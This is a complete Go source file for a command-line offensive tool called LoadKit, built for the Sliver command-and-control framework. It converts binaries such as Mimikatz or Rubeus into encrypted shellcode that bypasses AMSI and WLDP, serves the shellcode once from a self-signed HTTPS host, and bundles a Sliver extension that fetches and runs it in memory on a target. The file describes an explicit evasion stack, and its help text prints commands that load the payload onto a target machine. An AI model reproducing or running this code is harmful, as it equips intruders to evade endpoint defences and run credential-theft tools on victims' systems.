// LoadKit — in-memory PE execution for Sliver.
//
// Converts any PE binary (EXE, DLL, .NET assembly) to Donut shellcode,
// XOR-encrypts it, and stages it for execution via the Sliver Extension
// (load.x64.dll). No file touches disk on the target beyond the extension DLL.
//
// Evasion stack:
//   - Donut patches AMSI + WLDP before executing the PE (bypass=3)
//   - Donut applies Chaskey-CTR module encryption (entropy=3)
//   - XOR-32 encrypts the shellcode in transit
//   - HTTPS staging (operator self-signed cert, one-time server)
//   - NT-native memory allocation on target (NtAllocateVirtualMemory)
//   - No RWX pages on target (alloc RW → protect RX)
package main

import (
	"archive/tar"
	"compress/gzip"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"context"
	"sync/atomic"
	"time"

	"github.com/Binject/go-donut/donut"
	"github.com/spf13/cobra"
)

var rootCmd = &cobra.Command{
	Use:   "loadkit",
	Short: "In-memory PE execution for Sliver (Donut → shellcode → Extension)",
	Long: `LoadKit converts any PE binary (EXE, DLL, .NET assembly) to Donut shellcode,
encrypts it, and provides a Sliver Extension that fetches, decrypts, and executes
it entirely in memory.

Supported binary types:
  • Native EXE   — WinPEAS, Mimikatz, SharpHound, any x64 EXE
  • Native DLL   — with optional export method (-method flag)
  • .NET assembly — Rubeus, SharpView, PowerView, any .NET EXE/DLL`,
}

// ── load ──────────────────────────────────────────────────────────────────

var loadCmd = &cobra.Command{
	Use:   "load",
	Short: "Convert a PE binary to Donut shellcode and stage it for Sliver",
	Long: `Converts the binary to Donut shellcode with AMSI+WLDP bypass, XOR-encrypts it,
writes payload.enc, and prints the Sliver command to execute it.

The load.x64.dll Extension fetches the payload from the operator's HTTPS server,
decrypts, runs the shellcode in-memory, captures stdout/stderr, and returns
output to the Sliver console.`,
	Example: `  # .NET assembly (e.g. Rubeus)
  loadkit load --binary rubeus.exe --args "kerberoast /nowrap" --url https://192.168.1.10:8443/p --serve

  # Native EXE (auto-detects type)
  loadkit load --binary winpeas.exe --url https://192.168.1.10:8443/p --serve

  # DLL with specific exported entry point
  loadkit load --binary mimikatz.dll --method DllMain --url https://192.168.1.10:8443/p --serve`,
	RunE: runLoad,
}

var (
	loadBinary string
	loadArgs   string
	loadMethod string
	loadURL    string
	loadOutput string
	loadServe  bool
	loadPort   int
)

func init() {
	loadCmd.Flags().StringVar(&loadBinary, "binary", "", "path to EXE, DLL, or .NET assembly (required)")
	loadCmd.Flags().StringVar(&loadArgs, "args", "", "command-line arguments passed to the binary")
	loadCmd.Flags().StringVar(&loadMethod, "method", "", "DLL export to invoke (DLLs only; empty = DllMain)")
	loadCmd.Flags().StringVar(&loadURL, "url", "", "your HTTPS host (e.g. https://10.0.0.1:8443) — the path is ignored, a random one is generated (required)")
	loadCmd.Flags().StringVarP(&loadOutput, "output", "o", "build", "output directory for payload.enc")
	loadCmd.Flags().BoolVar(&loadServe, "serve", false, "start one-time HTTPS server after converting")
	loadCmd.Flags().IntVar(&loadPort, "port", 8443, "port for payload server (when --serve)")
	_ = loadCmd.MarkFlagRequired("binary")
	_ = loadCmd.MarkFlagRequired("url")
}

func runLoad(_ *cobra.Command, _ []string) error {
	// ── Step 1: Donut → shellcode ─────────────────────────────────────────

	cfg := &donut.DonutConfig{
		Arch:       donut.X64,
		Bypass:     3,          // continue even if AMSI/WLDP bypass fails
		Entropy:    uint32(3),  // random names + Chaskey-CTR encryption (max obfuscation)
		ExitOpt:    uint32(1),  // exit thread (not process — avoids killing the Sliver agent)
		Parameters: loadArgs,
		Method:     loadMethod,
	}

	fmt.Printf("[*] Converting %s to Donut shellcode ...\n", filepath.Base(loadBinary))
	scBuf, err := donut.ShellcodeFromFile(loadBinary, cfg)
	if err != nil {
		return fmt.Errorf("donut: %w", err)
	}
	shellcode := scBuf.Bytes()
	fmt.Printf("[+] Shellcode: %d bytes (AMSI+WLDP bypass, Chaskey-CTR module encryption)\n", len(shellcode))

	// ── Step 2: XOR-32 encrypt shellcode ──────────────────────────────────

	xorKey := make([]byte, 32)
	if _, err := rand.Read(xorKey); err != nil {
		return fmt.Errorf("generating key: %w", err)
	}

	encrypted := make([]byte, len(shellcode))
	for i, b := range shellcode {
		encrypted[i] = b ^ xorKey[i%32]
	}

	// ── Step 3: Write payload.enc ──────────────────────────────────────────

	if err := os.MkdirAll(loadOutput, 0o755); err != nil {
		return err
	}
	payloadPath := filepath.Join(loadOutput, "payload.enc")
	if err := os.WriteFile(payloadPath, encrypted, 0o600); err != nil {
		return fmt.Errorf("writing payload: %w", err)
	}

	// ── Step 4: Build staging URL + print command ─────────────────────────

	keyHex := hex.EncodeToString(xorKey)
	fmt.Printf("\n[+] payload → %s (%d bytes)\n", payloadPath, len(encrypted))
	fmt.Printf("[+] key     → %s\n\n", keyHex)
	fmt.Printf("[i] First time (once per Sliver server):\n")
	fmt.Printf("    sliver> extensions install build/load-0.1.0.tar.gz\n\n")

	// ── Step 5: Serve payload (optional) ──────────────────────────────────

	if loadServe {
		srv := newPayloadServer(encrypted, loadPort)

		// Build the real URL: use the scheme+host from --url, replace path with the random one.
		baseURL, err := url.Parse(loadURL)
		if err != nil {
			return fmt.Errorf("invalid --url: %w", err)
		}
		stagingURL := fmt.Sprintf("%s://%s%s", baseURL.Scheme, baseURL.Host, srv.path)

		fmt.Printf("[*] One-shot HTTPS server on :%d — shuts down after one download\n", loadPort)
		fmt.Printf("[+] Staging URL: %s\n", stagingURL)
		fmt.Printf("    (random path generated automatically — only this URL works)\n\n")
		fmt.Printf("[i] Execute in Sliver:\n")
		fmt.Printf("    sliver (TARGET)> load url=%s key=%s\n\n", stagingURL, keyHex)

		return srv.ListenAndServe()
	}

	// No --serve: tell the operator what to do next.
	fmt.Printf("[i] Start the staging server when ready:\n")
	fmt.Printf("    ./loadkit serve --payload %s\n", payloadPath)
	fmt.Printf("    (the server will print the exact URL to use)\n\n")
	fmt.Printf("[i] Then in Sliver:\n")
	fmt.Printf("    sliver (TARGET)> load url=<URL printed by serve> key=%s\n\n", keyHex)
	return nil
}

// ── build-ext ─────────────────────────────────────────────────────────────

var buildExtCmd = &cobra.Command{
	Use:   "build-ext",
	Short: "Compile load.x64.dll (Sliver Extension DLL)",
	Example: `  loadkit build-ext --output build/`,
	RunE:  runBuildExt,
}

var buildExtOutput string

func init() {
	buildExtCmd.Flags().StringVarP(&buildExtOutput, "output", "o", "build", "output directory")
}

func runBuildExt(_ *cobra.Command, _ []string) error {
	modRoot, err := findModRoot()
	if err != nil {
		return err
	}
	cSrcDir := filepath.Join(modRoot, "c", "load")
	if err := os.MkdirAll(buildExtOutput, 0o755); err != nil {
		return err
	}

	fmt.Println("[*] Compiling load.x64.dll ...")
	cmd := exec.Command("make", "-C", cSrcDir)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("make: %w", err)
	}

	src := filepath.Join(cSrcDir, "load.x64.dll")
	dst := filepath.Join(buildExtOutput, "load.x64.dll")
	if err := copyFile(src, dst); err != nil {
		return err
	}
	fmt.Printf("[+] load.x64.dll → %s\n", dst)
	fmt.Printf("[i] Next: loadkit bundle --output build/load-0.1.0.tar.gz\n")
	return nil
}

// ── bundle ────────────────────────────────────────────────────────────────

var bundleCmd = &cobra.Command{
	Use:   "bundle",
	Short: "Package load.x64.dll + extension.json into a Sliver extension tarball",
	Example: `  loadkit bundle --output build/load-0.1.0.tar.gz`,
	RunE:  runBundle,
}

var bundleOutput string

func init() {
	bundleCmd.Flags().StringVarP(&bundleOutput, "output", "o", "build/load-0.1.0.tar.gz", "output tarball path")
}

func runBundle(_ *cobra.Command, _ []string) error {
	modRoot, err := findModRoot()
	if err != nil {
		return err
	}

	manifest := filepath.Join(modRoot, "extension.json")
	dll := filepath.Join(modRoot, "build", "load.x64.dll")

	for _, f := range []string{manifest, dll} {
		if _, err := os.Stat(f); err != nil {
			return fmt.Errorf("missing %s\n  → run 'loadkit build-ext' first", filepath.Base(f))
		}
	}

	if err := os.MkdirAll(filepath.Dir(bundleOutput), 0o755); err != nil {
		return err
	}

	if err := packTarGz(bundleOutput, map[string]string{
		"./extension.json": manifest,
		"./load.x64.dll":   dll,
	}); err != nil {
		return err
	}
	fmt.Printf("[+] Extension tarball → %s\n", bundleOutput)
	fmt.Printf("[i] Install: sliver> extensions install %s\n", bundleOutput)
	return nil
}

// ── serve ─────────────────────────────────────────────────────────────────

var serveCmd = &cobra.Command{
	Use:   "serve",
	Short: "Serve an encrypted payload once over HTTPS then shut down",
	Example: `  loadkit serve --payload build/payload.enc --port 8443`,
	RunE:  runServe,
}

var (
	servePayload string
	servePort    int
)

func init() {
	serveCmd.Flags().StringVar(&servePayload, "payload", "", "path to encrypted payload file (required)")
	serveCmd.Flags().IntVar(&servePort, "port", 8443, "port to listen on")
	_ = serveCmd.MarkFlagRequired("payload")
}

func runServe(_ *cobra.Command, _ []string) error {
	data, err := os.ReadFile(servePayload)
	if err != nil {
		return fmt.Errorf("reading payload: %w", err)
	}
	fmt.Printf("[*] Serving %s on :%d (one download, then shutdown)\n", servePayload, servePort)
	return newPayloadServer(data, servePort).ListenAndServe()
}

// ── root ──────────────────────────────────────────────────────────────────

func init() {
	rootCmd.AddCommand(loadCmd, buildExtCmd, bundleCmd, serveCmd)
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}

// ── helpers ───────────────────────────────────────────────────────────────

func findModRoot() (string, error) {
	if root := os.Getenv("LOADKIT_ROOT"); root != "" {
		return root, nil
	}
	dir, _ := os.Getwd()
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir, nil
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	return "", fmt.Errorf("go.mod not found; set LOADKIT_ROOT to the repo root")
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

func packTarGz(outPath string, files map[string]string) error {
	f, err := os.Create(outPath)
	if err != nil {
		return err
	}
	defer f.Close()

	gz := gzip.NewWriter(f)
	defer gz.Close()
	tw := tar.NewWriter(gz)
	defer tw.Close()

	for archName, srcPath := range files {
		fi, err := os.Stat(srcPath)
		if err != nil {
			return err
		}
		hdr := &tar.Header{
			Name:    archName,
			Mode:    0o644,
			Size:    fi.Size(),
			ModTime: fi.ModTime(),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			return err
		}
		in, err := os.Open(srcPath)
		if err != nil {
			return err
		}
		_, err = io.Copy(tw, in)
		in.Close()
		if err != nil {
			return err
		}
	}
	return nil
}

// ── one-shot HTTPS payload server ─────────────────────────────────────────

type payloadServer struct {
	data   []byte
	port   int
	path   string
	served atomic.Bool
}

func newPayloadServer(data []byte, port int) *payloadServer {
	pathBytes := make([]byte, 8)
	rand.Read(pathBytes) //nolint:errcheck
	return &payloadServer{
		data: data,
		port: port,
		path: "/" + hex.EncodeToString(pathBytes),
	}
}

func (s *payloadServer) ListenAndServe() error {
	cert, err := selfSignedCert()
	if err != nil {
		return err
	}
	mux := http.NewServeMux()
	srv := &http.Server{
		Addr:    fmt.Sprintf(":%d", s.port),
		Handler: mux,
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		},
	}
	mux.HandleFunc(s.path, func(w http.ResponseWriter, r *http.Request) {
		if !s.served.CompareAndSwap(false, true) {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write(s.data) //nolint:errcheck
		go func() {
			time.Sleep(500 * time.Millisecond)
			srv.Shutdown(context.Background()) //nolint:errcheck
		}()
	})

	if err := srv.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
		return err
	}
	return nil
}

func selfSignedCert() (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "operator"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),
	}
	certDER, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}
	keyDER, _ := x509.MarshalECPrivateKey(key)
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	return tls.X509KeyPair(certPEM, keyPEM)
}
